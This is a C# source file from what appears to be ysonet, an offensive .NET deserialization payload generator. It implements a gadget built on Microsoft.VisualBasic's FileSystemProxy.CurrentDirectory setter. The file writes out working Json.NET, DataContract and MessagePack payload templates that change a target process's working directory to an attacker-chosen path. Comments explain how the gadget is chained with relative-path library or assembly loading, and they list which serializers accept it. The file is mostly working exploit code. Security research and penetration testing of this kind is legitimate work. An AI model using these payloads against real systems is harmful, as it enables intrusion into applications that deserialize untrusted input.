using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// Microsoft.VisualBasic.MyServices.FileSystemProxy.CurrentDirectory is a one-line
    /// setter whose body is Microsoft.VisualBasic.FileIO.FileSystem.CurrentDirectory =
    /// value, which is Directory.SetCurrentDirectory(value). So assigning one string during
    /// deserialization changes the TARGET PROCESS's working directory, for every thread,
    /// for the rest of its life.
    ///
    /// That is not code execution and this gadget does not claim it. What it is worth is
    /// what the target does AFTERWARDS with a relative path: a bare-name native LoadLibrary
    /// or an Assembly.LoadFrom with a relative path resolves against the working directory,
    /// a relative read returns whatever the attacker put there, and a relative write lands
    /// where the attacker chose. It is the in-box equivalent of the xunit
    /// PreserveWorkingFolder gadget this project already carries in ThirdPartyGadgets, and
    /// it needs no third-party assembly: Microsoft.VisualBasic is in the GAC on every .NET
    /// Framework install.
    ///
    /// WHY THE PROXY AND NOT Environment.CurrentDirectory. There are three carriers for the
    /// same sink and only this one is reachable. System.Environment.CurrentDirectory and
    /// Microsoft.VisualBasic.FileIO.FileSystem.CurrentDirectory are both STATIC, and no
    /// serializer here names a static member. FileSystemProxy's CurrentDirectory is an
    /// instance property that reaches the static one, so it is the only member a payload
    /// can name.
    ///
    /// ITS ONLY CONSTRUCTOR IS internal, and that is what decides the formatter list.
    /// Hexacon's write-up expected Json.NET to need non-public-constructor configuration
    /// for it; measured on the Json.NET this project ships, it does NOT. Json.NET falls
    /// back to a non-public default constructor when the type has no parameterized
    /// constructor at all, which is exactly this type's shape. The DataContract family
    /// never calls a constructor for a plain POCO, so all three of those work too, and
    /// MessagePack Typeless constructs the shape as well. Everything that insists on a
    /// PUBLIC parameterless constructor is out, which is measured in
    /// SupportedFormatters() below.
    ///
    /// Everything this gadget emits lives in this file: the target type names, every
    /// formatter template, the MessagePack surrogate, and the root type the
    /// DataContractJsonSerializer self-test needs.
    /// </summary>
    public class FileSystemProxyCurrentDirectoryGenerator : GenericGenerator
    {
        // The assembly qualified name, spelled once. It is template text everywhere except
        // the DataContractJsonSerializer self-test, which needs it as a resolvable type
        // because that format writes no type name into the document.
        private const string FileSystemProxyAssemblyQualifiedName =
            "Microsoft.VisualBasic.MyServices.FileSystemProxy, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";

        // The space-free spelling the hand written SharpSerializer and YamlDotNet documents
        // use. (Neither is advertised here, but the two DataContract documents below need
        // the assembly display name on its own, so it is split out.)
        private const string VisualBasicAssemblyName =
            "Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";

        // The data contract namespace the DataContract family derives for a plain type:
        // the fixed prefix plus the CLR namespace. The contract NAME is the bare type name,
        // so the root element below is <FileSystemProxy>.
        private const string FileSystemProxyContractNamespace =
            "http://schemas.datacontract.org/2004/07/Microsoft.VisualBasic.MyServices";

        private bool rawInput;

        // file-system, because the effect is on the target's file system state: every
        // relative path it resolves afterwards moves with it.
        //
        // It does NOT declare PayloadKind.CodeExecution. A bare-name library load resolving
        // against the new directory is the strongest thing this enables, but it needs the
        // target to perform that load, so it is a property of the target rather than of the
        // payload. Borrowing the impact of what this is chained WITH is exactly what the
        // facet vocabulary is meant to stop.
        //
        // Nor PayloadKind.DenialOfService: the facet arms the acknowledgement machinery in
        // Helpers/Core/DosPolicy.cs and is for a payload whose PURPOSE is disruption.
        // Breaking a target that relies on relative paths is a consequence of where the
        // operator points it, and that belongs in AdditionalInfo().
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.FileSystem)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // The working directory really moved on 4.8.1, on all six advertised
                // formatters (FireFileSystemProxyCurrentDirectory in ysonet.Tests). The floor
                // is the project's default 4.0: FileSystemProxy predates it, but nobody has
                // run this chain on the 2.0 CLR.
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        // Bazydlo named the three .NET Framework carriers for the SetCurrentDirectory
        // primitive in the 2023 Hexacon paper, and assessed them against Json.NET's default
        // configuration.
        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Kept short: this is the first block of the interactive info panel, and a long one
        // pushes the formatter list and the category summary off the visible rows. The
        // chaining detail is in the public docs and in the -c option help.
        public override string AdditionalInfo()
        {
            return "Sets the target process working directory, so every later relative path in it resolves where you chose. Not code execution on its own.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        // MEASURED, one formatter at a time, against the real type, with the process
        // working directory read before and after (GadgetProbe in ysonet.Tests). The one
        // shape that decides the whole list is the constructor: FileSystemProxy is public,
        // its only constructor is internal, and it has no parameterized one.
        //
        // IN, and why:
        //  - Json.NET builds it in its DEFAULT configuration. Its rule is "use the
        //    non-public default constructor when there is no parameterized creator", and
        //    this type has none. Hexacon expected this to need ConstructorHandling
        //    .AllowNonPublicDefaultConstructor; on the Json.NET this project ships it does
        //    not, so the gadget is stronger than the published assessment.
        //  - NetDataContractSerializer, DataContractSerializer and DataContractJsonSerializer
        //    treat it as a plain (non-attributed) data contract, which they build without
        //    calling any constructor, and then assign the public read/write members. The
        //    read-only Drives and SpecialDirectories properties are simply not in the
        //    contract, so they cost nothing.
        //  - Both MessagePack Typeless flavours construct the shape and assign the setter.
        //
        // OUT, and why, so nobody re-measures them:
        //  - JavaScriptSerializer, YamlDotNet, SharpSerializerXml and SharpSerializerBinary
        //    all call Activator.CreateInstance and fail with "No parameterless constructor
        //    defined for this object"; fastJSON fails the same way one frame earlier
        //    ("Value cannot be null. Parameter name: con"). Xaml refuses with "No default
        //    constructor found".
        //  - XmlSerializer refuses for a second, independent reason: the type exposes
        //    ReadOnlyCollection<DriveInfo> Drives, so it demands an Add(DriveInfo) that the
        //    type does not have. A read-only property the payload never mentions is what
        //    costs it that formatter.
        //  - BinaryFormatter, SoapFormatter, LosFormatter and FsPickler restore FIELDS and
        //    need [Serializable]; FileSystemProxy carries no such attribute, and its own
        //    field is a SpecialDirectoriesProxy, not the directory.
        //
        // Microsoft.VisualBasic.Devices.ServerComputer was tried as an outer carrier - it is
        // public, has a public parameterless constructor, and exposes a read-only
        // FileSystemProxy - so that a formatter which cannot construct the proxy might still
        // populate the one the getter creates. It adds nothing: Json.NET reaches the setter
        // that way too (it already reaches it directly), and every formatter that cannot
        // construct the proxy also cannot populate a read-only member, so all of them
        // deserialized a ServerComputer and moved nothing.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.JsonNet,
                Formatters.NetDataContractSerializer,
                Formatters.DataContractSerializer,
                Formatters.DataContractJsonSerializer,
                Formatters.MessagePackTypeless,
                Formatters.MessagePackTypelessLz4,
            };
        }

        // TargetPath: -c is a directory on the TARGET, touched only when the payload runs.
        // Nothing is opened on the operator machine while the payload is built.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.TargetPath;
        }

        public override OptionSet Options()
        {
            return RawInputOption(v => rawInput = v);
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);

            // -t deserializes the payload HERE, so it really does move this process's
            // working directory. That is accepted - seeing the effect is what -t is for -
            // but it is put back immediately afterwards, because ysonet keeps running: a
            // relative --outputpath would otherwise be written into the directory the
            // operator just named, which is the gadget's own impact applied to the wrong
            // machine. --debugmode prints the before and after, so nothing is hidden.
            string before = SelfTestWillMoveThisProcess(inputArgs)
                ? Directory.GetCurrentDirectory()
                : null;
            try
            {
                object payload = FinishHandWrittenPayload(
                    BuildPayload(inputArgs.Cmd, formatter),
                    formatter,
                    inputArgs,
                    SelfTestRootType(formatter, inputArgs));
                RefuseIfDirectoryDidNotSurvive(payload, inputArgs.Cmd, formatter, inputArgs);
                return payload;
            }
            finally
            {
                RestoreWorkingDirectory(before, inputArgs);
            }
        }

        /// <summary>
        /// The directory is operator DATA the target hands straight to
        /// Directory.SetCurrentDirectory, and the two XML documents do not preserve it
        /// exactly in every shape. Two separate causes, and the refusal has to keep them
        /// apart or its advice becomes a dead end:
        ///
        ///  - The XML WRITER itself, with no minifier at all, loses a carriage return (it is
        ///    emitted raw, so every parser normalizes it away) and leading or trailing
        ///    whitespace in a text node. Dropping --minify does NOT recover these.
        ///  - The XML MINIFIER additionally collapses a repeated space and a "; " sequence
        ///    inside the document. Dropping --minify DOES recover those.
        ///
        /// So the minified branch must not lead with "Drop --minify": an operator who
        /// dropped the flag over a carriage return would be refused again by the same
        /// sentence. This is the shape RefusalAdviceNeverPromisesADeadEnd audits catalogue
        /// wide. It mirrors FileSystemInfo's wording, which delivers a path the same way.
        ///
        /// The two JSON documents put the value in a quoted string the JSON minifier leaves
        /// alone, and the two MessagePack streams carry it as a verbatim string record, so
        /// in practice only the XML pair can lose it. The check runs for all six anyway:
        /// which formatter is fragile is exactly the kind of fact that should not be
        /// hardcoded here. VERIFY, do not predict.
        /// </summary>
        private void RefuseIfDirectoryDidNotSurvive(object payload, string directory,
            string formatter, InputArgs inputArgs)
        {
            if (DirectorySurvived(payload, directory, formatter))
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            throw new ArgumentException(Name() + " cannot deliver this directory with " + formatter
                + (minified ? " and --minify" : "") + ": the payload no longer carries \"" + directory
                + "\" exactly, so the target would move somewhere else."
                + (minified
                    ? " Use a directory with no carriage return and no leading or trailing whitespace"
                        + " in a component; dropping --minify additionally recovers a repeated space"
                        + " and a \"; \" sequence, and nothing else."
                    : " Use a directory with no carriage return and no leading or trailing whitespace"
                        + " in a component.")
                + " The two MessagePack formats carry the string unchanged.");
        }

        // True when the emitted payload still names the exact directory.
        //
        //  - the two XML documents put it in a TEXT NODE, so it is read back with an XML
        //    reader (which decodes &amp; and friends to what the operator typed).
        //    includeAttributes is FALSE on purpose: both documents carry namespace and
        //    z:Type attributes, and letting one of those stand in for the value would hide a
        //    real loss;
        //  - the two JSON documents carry it inside a double quoted string, so the escaped
        //    rendering is what has to be present verbatim;
        //  - the two MessagePack streams have no minify pass at all
        //    (MinifyHandWrittenPayload returns a byte payload untouched) and store strings
        //    verbatim, so nothing could rewrite them.
        private bool DirectorySurvived(object payload, string directory, string formatter)
        {
            if (IsFormatter(formatter, Formatters.NetDataContractSerializer)
                || IsFormatter(formatter, Formatters.DataContractSerializer))
                return MinifiedTextGuard.MissingTextValues(payload, new[] { directory }, false).Count == 0;

            string text = payload as string;
            if (text == null)
                return true;

            return text.IndexOf(EscapeForJsonDoubleQuoted(directory, rawInput), StringComparison.Ordinal) >= 0;
        }

        private static bool SelfTestWillMoveThisProcess(InputArgs inputArgs)
        {
            return inputArgs != null && inputArgs.Test;
        }

        private void RestoreWorkingDirectory(string before, InputArgs inputArgs)
        {
            if (before == null)
                return;

            string after = Directory.GetCurrentDirectory();
            if (string.Equals(before, after, StringComparison.OrdinalIgnoreCase))
            {
                Debugging.ShowNote(inputArgs, Name()
                    + ": the self-test did not move this process (working directory is still \""
                    + after + "\").");
                return;
            }

            Debugging.ShowNote(inputArgs, Name() + ": the self-test moved this process from \""
                + before + "\" to \"" + after + "\". Putting it back so the rest of this run is unaffected.");
            try { Directory.SetCurrentDirectory(before); }
            catch (Exception ex)
            {
                Debugging.ShowNote(inputArgs, Name() + ": could not restore the working directory: "
                    + ex.Message);
            }
        }

        // Resolved only when the self-test actually needs it, so building a payload never
        // has to load Microsoft.VisualBasic on the operator machine.
        private static Type SelfTestRootType(string formatter, InputArgs inputArgs)
        {
            if (inputArgs == null || !inputArgs.Test)
                return null;
            if (!IsFormatter(formatter, Formatters.DataContractJsonSerializer))
                return null;
            return Type.GetType(FileSystemProxyAssemblyQualifiedName, true);
        }

        // ---- Payload templates -------------------------------------------------

        private object BuildPayload(string directory, string formatter)
        {
            if (IsMessagePackTypeless(formatter))
            {
                // Never build a real FileSystemProxy here: assigning CurrentDirectory IS the
                // effect, so it would move ysonet's own working directory while merely
                // GENERATING a payload. Serialize the surrogate below and let MessagePack
                // write the framework type's name instead.
                return MessagePackTypelessTypeSwap.SerializeAs(
                    new FileSystemProxySurrogate { CurrentDirectory = directory },
                    FileSystemProxyAssemblyQualifiedName,
                    IsMessagePackLz4(formatter));
            }

            if (IsFormatter(formatter, Formatters.JsonNet))
            {
                // Double quoted, so EscapeForJsonDoubleQuoted: \' is not a legal JSON escape
                // and a path like C:\John's dir would come back with the apostrophe mangled.
                return @"
{
    ""$type"":""" + FileSystemProxyAssemblyQualifiedName + @""",
    ""CurrentDirectory"":""" + EscapeForJsonDoubleQuoted(directory, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.NetDataContractSerializer))
            {
                // NetDataContractSerializer names the CLR type in z:Type / z:Assembly and
                // reads the members against the type's own data contract, so the element
                // name and namespace have to be the ones the contract derives: the bare type
                // name in the "2004/07" namespace plus the CLR namespace.
                return @"<FileSystemProxy xmlns=""" + FileSystemProxyContractNamespace + @""" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" z:Id=""1"" z:Type=""Microsoft.VisualBasic.MyServices.FileSystemProxy"" z:Assembly=""" + VisualBasicAssemblyName + @"""><CurrentDirectory>" + EscapeForXmlText(directory, rawInput) + @"</CurrentDirectory></FileSystemProxy>";
            }

            if (IsFormatter(formatter, Formatters.DataContractSerializer))
            {
                // Plain DataContractSerializer carries no type information at all: the
                // consumer decides the root type. This project states that in a
                // <root type="..."> envelope, which is also what PayloadReader reads back
                // for -t, so every DataContractSerializer gadget here writes the same shape.
                return @"<root type=""" + FileSystemProxyAssemblyQualifiedName + @"""><FileSystemProxy xmlns=""" + FileSystemProxyContractNamespace + @"""><CurrentDirectory>" + EscapeForXmlText(directory, rawInput) + @"</CurrentDirectory></FileSystemProxy></root>";
            }

            if (IsFormatter(formatter, Formatters.DataContractJsonSerializer))
            {
                // No type name in the document either: the target names the root type
                // itself, which is why SelfTestRootType above has to hand it to the
                // self-test.
                return @"
{
    ""CurrentDirectory"":""" + EscapeForJsonDoubleQuoted(directory, rawInput) + @"""
}";
            }

            throw UnsupportedFormatter(formatter);
        }

        // Shape only, never deserialized as itself: MessagePackTypelessTypeSwap rewrites the
        // type name to Microsoft.VisualBasic.MyServices.FileSystemProxy before the payload
        // leaves ysonet. The property name is what the target assigns, so it must match the
        // real type exactly.
        internal sealed class FileSystemProxySurrogate
        {
            public string CurrentDirectory { get; set; }
        }
    }
}
